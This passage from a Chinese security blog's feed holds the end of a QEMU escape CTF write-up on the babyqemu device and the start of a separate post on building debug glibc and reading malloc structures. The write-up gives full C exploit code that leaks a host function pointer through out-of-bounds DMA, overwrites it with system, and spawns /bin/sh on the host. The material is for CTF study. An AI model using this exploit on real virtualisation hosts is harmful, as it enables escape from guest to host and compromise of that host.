<span class="title">set_dst</span><span class="params">(<span class="keyword">uint64_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从src拷贝到dst</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_from_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(gva2gpa(dst));</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从dst写到dma</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(gva2gpa(src));</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(dst+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line">    <span class="comment">// set_cmd();</span></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc;</span><br><span class="line">    copy_from_dma(<span class="number">0</span>,&amp;leak_enc,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak_enc = %p&quot;</span>,leak_enc)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以在<code>cpu_physical_memory_rw</code>下断点</p><p><img src="https://s2.loli.net/2023/05/10/lrjS5xTY7cMOuUm.png" alt="image-20230510233452449"></p><p>可以看到实际与我们想要泄露的指针偏移为0x558a1d756fe8-0x558a1d755fe8=4096</p><p>把0修改为4096之后再运行一次，便可以获取函数指针</p><p><img src="https://s2.loli.net/2023/05/10/LRbqxG4CdyKBoTi.png" alt="image-20230510234931414"></p><p>需要注意的是最好<code>sleep(1)</code>，调试的时候发现断在<code>cpu_physical_memory_rw</code>后仍然输出了<code>[+] leak_enc =</code>，从运行顺序来说不太合理</p><p>然后就是算出距离system的plt的偏移，然后改写enc指针调用即可，IDA中可以直接查</p><p><img src="https://s2.loli.net/2023/05/10/6eKNGFDzA7pvagX.png" alt="image-20230510235033886"></p><p>调用enc指针在<code>hitb_dma_timer</code>里面有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">   v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">   opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">   cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改cmd进入这个分支就行了，具体方法和前面一样</p><p>所以越界写enc指针为<code>system</code>，然后再<code>dma_buff</code>上面写命令cmd,通过<code>enc(cmd)</code>来调用<code>system(cmd)</code>即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dst</span><span class="params">(<span class="keyword">uint64_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从src拷贝到dst</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_from_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(gva2gpa(dst));</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从dst写到dma</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(gva2gpa(src));</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(dst+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start_enc</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>|<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line">    <span class="comment">// set_cmd();</span></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc;</span><br><span class="line">    copy_from_dma(<span class="number">4096</span>,&amp;leak_enc,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak_enc = %lx&quot;</span>,leak_enc);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt =  leak_enc  - <span class="number">0x283DD0</span> + <span class="number">0x1FDB18</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system_plt = %lx&quot;</span>,system_plt);</span><br><span class="line">    <span class="keyword">char</span>* cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    copy_to_dma(cmd,<span class="number">0x114</span>,<span class="built_in">strlen</span>(cmd));</span><br><span class="line">    copy_to_dma(&amp;system_plt,<span class="number">4096</span>,<span class="number">8</span>);</span><br><span class="line">    start_enc(<span class="number">0x114</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/11/ZqIH3mxGpQ2CPDt.png" alt="image-20230511000604080"></p><h2 id="XCTF-华为高校挑战赛决赛-pipeline"><a href="#XCTF-华为高校挑战赛决赛-pipeline" class="headerlink" title="XCTF 华为高校挑战赛决赛 pipeline"></a>XCTF 华为高校挑战赛决赛 pipeline</h2><h2 id="D3CTF2021-D3dev"><a href="#D3CTF2021-D3dev" class="headerlink" title="D3CTF2021 D3dev"></a>D3CTF2021 D3dev</h2><h1 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h1><p><a href="https://xz.aliyun.com/t/6562#toc-1">qemu pwn-基础知识 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/">CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu | giantbranch’s blog</a></p><p><a href="https://xz.aliyun.com/t/6562#toc-1">qemu pwn-基础知识 - 先知社区 (aliyun.com)</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/09/19/qemu/">XCTF 华为高校挑战赛决赛 QEMU pipeline | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x03-QEMU-源码调试">【VIRT.0x00】Qemu - I：Qemu 简易食用指南 - arttnba3’s blog</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;好，我润！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;PCI设备简介&quot;&gt;&lt;a href=&quot;#PCI设备简介&quot; class=&quot;headerlink&quot; title=&quot;PCI设备简介&quot;&gt;&lt;/a&gt;PCI设备简介&lt;/h1&gt;&lt;p&gt;什么是PCI设备，关</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="qemu" scheme="http://phot0n.com/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>libc的源码调试与分析</title>
    <link href="http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2023-03-31T08:37:53.000Z</published>
    <updated>2023-04-06T16:57:00.373Z</updated>
    
    <content type="html"><![CDATA[<p>之前也断断续续看过一些libc的实现（在之前的fastbin reverse into tcache以及large bin attack文章中总结过一些），但是总感觉不太连贯，没有形成一个体系。并且光干看代码总感觉少点什么。如果看别的大佬的博客的话，最终还是别人的，远远没有自己总结一遍来得深刻。而最近确实一直在摆烂，所以借此机会督促自己学点什么东西。</p><p>这里主要分析的是内存管理模块还有一些IO模块</p><h1 id="glibc的源码调试配置"><a href="#glibc的源码调试配置" class="headerlink" title="glibc的源码调试配置"></a>glibc的源码调试配置</h1><p>我们知道，如果我们想用gdb进行源码级调试，我们可以在编译的时候添加<code>-g</code>选项，然后便可以对程序进行调试。但是如果我们想要对glibc进行源码级调试，我们需要带调试版本的glibc</p><p>主要有两种方案，一种是直接下载官方编译好的带符号的glibc，还有一种是自行编译，这里选择了后者,方便我们对源码进行魔改，也方便调试不同版本的源码。</p><p>另外提一句，推荐利用<a href="https://elixir.bootlin.com/glibc/glibc-2.35进行源码的观看，可以很方便的查定义与引用的地方(当时学kernel的时候也是看的这个网站">https://elixir.bootlin.com/glibc/glibc-2.35进行源码的观看，可以很方便的查定义与引用的地方(当时学kernel的时候也是看的这个网站</a>)</p><h2 id="下载glibc源码"><a href="#下载glibc源码" class="headerlink" title="下载glibc源码"></a>下载glibc源码</h2><p>在如下网址可以根据偏好下载相应glibc版本的源码。我选择的是glibc-2.35</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;glibc&#x2F;</span><br></pre></td></tr></table></figure><h2 id="编译带符号的glibc"><a href="#编译带符号的glibc" class="headerlink" title="编译带符号的glibc"></a>编译带符号的glibc</h2><p>首先我们需要建立一个编译目录(glibc不允许直接在原目录下进行编译)。这里我在glibc-2.35的上级目录建立了一个名叫<code>build</code>的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir build</span><br></pre></td></tr></table></figure><p>然后执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ CFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span></span><br><span class="line">$ CXXFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span></span><br><span class="line">$ ../glibc-2.35/configure --prefix=&lt;/glibc/path&gt;</span><br></pre></td></tr></table></figure><p>(尖括号里面的路径自行替换)笔者在执行的时候出现了make版本过低的错误，以及一个关于LD_LIBRARY_PATH的错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** These critical programs are missing or too old:make...</span><br><span class="line">LD_LIBRARY_PATH shouldn&#39;t contain the current directory when..</span><br></pre></td></tr></table></figure><p>升级完make，然后<code>unset  LD_LIBRARY_PATH</code>即可</p><p>执行完之后会生成Makefile 相关的文件，之后make即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>需要编译挺长时间的。而且中途会出现一些错误。比如说笔者用的是<code>WSL2</code>,曾出现过这个错误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/glibc<span class="number">-2.35</span>/elf/../elf/dl-tls.c:<span class="number">1092</span>: undefined reference to `__lll_lock_wait_private<span class="number">&#x27;</span></span><br><span class="line">/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/glibc<span class="number">-2.35</span>/elf/../elf/dl-tls.c:<span class="number">1103</span>: undefined reference to `__lll_lock_wake_private<span class="number">&#x27;</span></span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br><span class="line">Makefile:1234: recipe for target &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/build/elf/ld.so&#x27; failed</span><br><span class="line">make[<span class="number">2</span>]: *** [/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/build/elf/ld.so] Error <span class="number">1</span></span><br><span class="line">make[2]: Leaving directory &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/glibc-2.35/elf&#x27;</span><br><span class="line">Makefile:483: recipe for target &#x27;elf/subdir_lib&#x27; failed</span><br><span class="line">make[<span class="number">1</span>]: *** [elf/subdir_lib] Error <span class="number">2</span></span><br><span class="line">make[1]: Leaving directory &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/glibc-2.35&#x27;</span><br><span class="line">Makefile:9: recipe for target &#x27;all&#x27; failed</span><br><span class="line">make: *** [all] Error <span class="number">2</span></span><br></pre></td></tr></table></figure><p>根据查阅资料，似乎是因为大小写敏感所导致的。(参见<a href="[Linker error · Issue #742 · riscv-collab/riscv-gnu-toolchain (github.com">这个</a>](<a href="https://github.com/riscv-collab/riscv-gnu-toolchain/issues/742">https://github.com/riscv-collab/riscv-gnu-toolchain/issues/742</a>)) 和<a href="[glibc compilation error: undefined reference to `__lll_lock_wait_private&#39; - Stack Overflow](https://stackoverflow.com/questions/73417071/glibc-compilation-error-undefined-reference-to-lll-lock-wait-private">这个</a>) )</p><p>把build目录设置成大小写敏感应该就行了,需要注意的是，要递归地进行目录设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">r&#x27;D:\DeskTop\glibc\glibc-2.35\build&#x27;</span></span><br><span class="line"><span class="keyword">for</span> folderName, subfolders, fileNames <span class="keyword">in</span> os.walk(path):</span><br><span class="line">    os.system(<span class="string">&#x27;fsutil.exe file SetCaseSensitiveInfo &#x27;</span> + folderName + <span class="string">&#x27; enable&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;转化完成&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后应该就能修好，如果不行的话可以<code>make clean</code>一下试试</p><p>之后build目录下就有了编译好的libc文件了。</p><p>后面你可以选择利用<code>patchelf</code>修改ld.so与libc，然后就能实现源码调试了</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="内存管理模块"><a href="#内存管理模块" class="headerlink" title="内存管理模块"></a>内存管理模块</h2><p>关于<code>malloc</code>的实现主要在<code>malloc/</code>目录下</p><h3 id="相关数据结构与宏"><a href="#相关数据结构与宏" class="headerlink" title="相关数据结构与宏"></a>相关数据结构与宏</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><p>首先当然是典中典之chunk的结构。当我们通过malloc等函数申请一块内存区域时，如果成功glibc将会把一个指向chunk的数据部分的指针返回给我们。</p><p>一般我个人喜欢把<code>chunk</code>分为chunk头部分以及数据部分。chunk头包含<code>mchunk_prev_size</code>以及<code>mchunk_size</code>，一般而言是用户不能直接控制的(溢出或者修改指针除外)。而数据部分就是拿来存储用户数据的（包括后面的fd,bk字段，但是这些字段是只有free的时候才会有意义，而在使用阶段被用户拿来作为存储数据）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>INTERNAL_SIZE_T</code>宏定义为<code>size_t</code> 在32位下为4字节，64位下为8字节。</p><p>各个字段解释如下</p><ul><li><code>mchunk_prev_size</code>:如果这个chunk物理相邻的上一个chunk(地址比它小，并且指针差值刚好为前一个chunk的大小)是空闲的，那么这个字段记录的是上面一个chunk的大小。若非空闲，则可以被上一个chunk拿来存储数据</li><li><code>mchunk_size</code>: 记录当前chunk的大小。大小必须是2*SIZE_SZ的整数倍。如果malloc的时候不是整数倍会被自动转化(后面对宏以及malloc函数的解释中有介绍实现)。其中SIZE_SZ在32位系统中为4，64位系统中为8。所以mchunk_size是至少8字节对齐的，也就是说最后3比特位必定是0.因此为了空间复用，我们把最后三位用来记录一些属性，其中从高到低为 :<ul><li><code>NON_MAIN_ARENA</code>:记录该chunk是否不属于主线程，1代表不属于主线程，0代表属于主线程</li><li><code>IS_MAPPED</code>，记录当前 chunk 是否是由 mmap 分配的</li><li><code>PREV_INUSE</code> 记录前一个chunk块是否被分配。</li></ul></li><li><code>fd,bk</code> 。当chunk处于使用状态时，从fd开始(包括fd)是用来存储用户数据的。当chunk处于free状态时，fd指向下一个空闲的chunk，而bk指向上一个空闲的chunk。<strong>需要注意的是这里fd，bk指向的空闲chunk并不一定是物理相邻的。fd，bk的作用是根据chunk的大小放入相应的bin之后用来像链表一样连接每个chunk(打个比方每个bins的头类似一个头节点，然后被free的第一个chunk满足一个bins的大小之后被链进去，第二个被free的chunk同样满足大小之后也会被链进去，此时这两个chunk之间的fd，bk就起到了连接两个chunk的左右。但是视bin的实现而定，有些是单向链表有些事双向</strong></li><li><code>fd_nextsize， bk_nextsize</code>。同<code>fd,bk</code>，不过只有大chunk(满足large chunk的大小范围)才用。具体的我在之前的一篇介绍<code>large bin attack</code>的博客中介绍过</li></ul><h4 id="相关的宏"><a href="#相关的宏" class="headerlink" title="相关的宏"></a>相关的宏</h4><p>这里介绍一些可能会用到的宏（主要是对注释进行渣翻以及给点自己的理解）</p><h5 id="chunk相关的宏"><a href="#chunk相关的宏" class="headerlink" title="chunk相关的宏"></a>chunk相关的宏</h5><p>chunk相关的宏:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tag_at (<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_address_get_tag (ptr);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*chunk头的大小，为2*SIZE_SZ(SIZE_SZ在32位系统中为4，64位系统中为8)。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_HDR_SZ (2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把chunk地址转化为数据部分的地址(加上一个chunk头的大小即可) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这个和上面的chunk2mem_tag差不多，但是在使用了tag时会提取正确的tag(一些系统支持tag的概念，不过这不是我们关注的重点,当成不使用tag即可*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem_tag(p) ((void*)tag_at ((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把用户使用的数据部分的地址转化为chunk地址(减去一个chunk头的大小即可) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)tag_at (((char*)(mem) - CHUNK_HDR_SZ)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 最小可能的chunk大小 （fd_nextsize在malloc_chunk中的偏移)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">/*可分配的对齐chunk的最小大小 这个MALLOC_ALIGN_MASK可以在某处注释中找到(MALLOC_ALIGN_MASK is CHUNK_HDR_SZ-1)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span 